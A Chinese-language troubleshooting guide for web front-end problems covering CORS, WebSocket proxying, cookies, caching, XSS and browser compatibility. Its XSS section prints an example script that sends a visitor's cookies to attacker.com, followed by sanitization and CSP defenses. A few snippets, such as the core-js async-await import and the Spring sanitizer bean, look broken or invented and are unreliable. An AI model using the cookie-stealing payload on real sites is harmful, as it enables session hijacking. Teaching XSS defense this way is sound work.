## 一、CORS问题排查

### 案例1：跨域请求失败

**问题现象：**
浏览器报错："No 'Access-Control-Allow-Origin' header"

**分析过程：**
```javascript
// 浏览器控制台
Access to fetch at 'http://api.example.com' from origin 'http://example.com' 
has been blocked by CORS policy: 
No 'Access-Control-Allow-Origin' header is present on the requested resource.

// 检查响应头
// Network面板 → 找到请求 → Response Headers
// 确认是否缺少CORS头
```

**解决方案：**

服务端配置：
```nginx
# Nginx配置
location /api/ {
    # 允许特定域名
    add_header 'Access-Control-Allow-Origin' 'http://example.com' always;
    
    # 或使用变量（动态来源）
    # set $cors_origin "";
    # if ($http_origin ~* "^https?://(.+\.)?example\.com$") {
    #     set $cors_origin $http_origin;
    # }
    # add_header 'Access-Control-Allow-Origin' $cors_origin always;
    
    add_header 'Access-Control-Allow-Methods' 'GET, POST, PUT, DELETE, OPTIONS' always;
    add_header 'Access-Control-Allow-Headers' 'DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range,Authorization' always;
    add_header 'Access-Control-Allow-Credentials' 'true' always;
    
    # 处理preflight
    if ($request_method = 'OPTIONS') {
        add_header 'Access-Control-Max-Age' 1728000;
        add_header 'Content-Type' 'text/plain charset=UTF-8';
        add_header 'Content-Length' 0;
        return 204;
    }
}
```

```java
// Spring Boot
@CrossOrigin(origins = "http://example.com", allowCredentials = "true")
@RestController
public class ApiController { }
```

```python
# Flask
from flask_cors import CORS
CORS(app, resources={r"/api/*": {"origins": "http://example.com", "supports_credentials": True}})
```

## 二、WebSocket问题

### 案例2：WebSocket连接失败

**问题现象：**
WebSocket连接报错，页面无法实时通信。

**分析过程：**
```javascript
// 错误信息
WebSocket connection to 'wss://example.com/ws' failed

// 排查步骤
// 1. 检查WebSocket服务器是否运行
// 2. 检查端口是否开放
// 3. 检查反向代理配置
// 4. 检查SSL证书
```

**解决方案：**

```nginx
# Nginx WebSocket配置
map $http_upgrade $connection_upgrade {
    default upgrade;
    '' close;
}

server {
    listen 443 ssl http2;
    
    location /ws/ {
        proxy_pass http://127.0.0.1:8080;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection $connection_upgrade;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        
        # 超时配置
        proxy_read_timeout 86400;
        proxy_send_timeout 86400;
    }
}
```

```javascript
// 客户端重连机制
class WebSocketClient {
    constructor(url) {
        this.url = url;
        this.reconnectDelay = 1000;
        this.maxDelay = 30000;
        this.connect();
    }
    
    connect() {
        this.ws = new WebSocket(this.url);
        
        this.ws.onopen = () => {
            console.log('Connected');
            this.reconnectDelay = 1000; // 重置延迟
        };
        
        this.ws.onclose = () => {
            console.log('Disconnected, reconnecting...');
            setTimeout(() => {
                this.connect();
            }, this.reconnectDelay);
            this.reconnectDelay = Math.min(this.reconnectDelay * 2, this.maxDelay);
        };
        
        this.ws.onerror = (error) => {
            console.error('Error:', error);
        };
    }
}
```

## 三、Cookie问题

### 案例3：Cookie无法跨域

**问题现象：**
登录成功但Cookie未保存，后续请求无法认证。

**分析过程：**
```javascript
// 检查
// 1. Network面板查看Set-Cookie响应头
// 2. 检查Cookie是否被浏览器接受
// 3. 检查SameSite属性
```

**解决方案：**

```nginx
# 设置Cookie（生产环境）
add_header Set-Cookie "session=xxx; Path=/; HttpOnly; SameSite=Strict; Secure";
# HttpOnly: 防止XSS
# Secure: 只在HTTPS发送
# SameSite=Lax/Strict/None
```

```javascript
// 客户端
fetch('/api', {
    credentials: 'include'  // 发送Cookie
});

// 如果跨域需要
// 服务端必须设置 Access-Control-Allow-Credentials: true
// 且 Access-Control-Allow-Origin 不能是 *
```

## 四、缓存问题

### 案例4：更新后用户看到旧内容

**问题现象：**
发布新版本后，用户刷新页面仍显示旧内容。

**分析过程：**
```bash
# 1. 检查缓存配置
# Network面板查看Cache-Control
# 2. 检查CDN缓存
# 3. 检查Service Worker缓存

# 诊断
curl -I http://example.com/app.js
# Cache-Control: public, max-age=31536000
# 说明缓存了一年
```

**解决方案：**

1. 使用hash文件名
```javascript
// webpack配置
output: {
    filename: '[name].[contenthash].js',
    chunkFilename: '[name].[contenthash].chunk.js'
}
```

2. 清理CDN缓存
```bash
# CDN控制台手动清理
# 或API清理
curl -X POST "https://api.cdn.com/purge" \
  -H "Authorization: Token xxx" \
  -d '{"urls": ["http://example.com/app.js"]}'
```

3. 强制刷新（用户端）
```javascript
// 添加版本号
<script src="app.js?v=2026032801"></script>
```

## 五、安全问题

### 案例5：XSS攻击

**问题现象：**
用户输入的内容被执行为JavaScript代码。

**分析过程：**
```html
<!-- 攻击示例 -->
<!-- 用户在评论区输入 -->
<script>
    document.location='http://attacker.com/steal?cookie='+document.cookie;
</script>

<!-- 如果直接渲染HTML -->
<div>{{ userComment }}</div>
<!-- 脚本会被执行 -->
```

**解决方案：**

1. 过滤HTML
```javascript
// DOMPurify库
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userComment);

// 或转义
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
```

2. 服务端过滤
```java
// Spring Boot
@Bean
public HtmlSanitizer htmlSanitizer() {
    return HtmlSanitizers.BLOCK_TAGS.onAllTags().build();
}
```

3. CSP头
```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce随机'; style-src 'self' 'unsafe-inline';";
```

## 六、兼容性

### 案例6：浏览器兼容问题

**问题现象：**
某些浏览器显示异常。

**分析过程：**
```javascript
// 1. 查看控制台错误
// 2. 检查特性支持
console.log('fetch' in window);  // false说明不支持
console.log('requestIdleCallback' in window);

// 3. 查看Can I Use
// https://caniuse.com/
```

**解决方案：**

1. Polyfill
```javascript
// promise polyfill
import 'core-js/stable/promise';

// fetch polyfill
import 'whatwg-fetch';

// async/await polyfill
import 'core-js/stable/async-await';
```

2. Babel转译
```javascript
// .babelrc
{
    "presets": [
        ["@babel/preset-env", {
            "useBuiltIns": "usage",
            "corejs": 3
        }]
    ]
}
```

3. 特性检测
```javascript
if ('IntersectionObserver' in window) {
    // 使用新特性
} else {
    // 回退方案
}
```
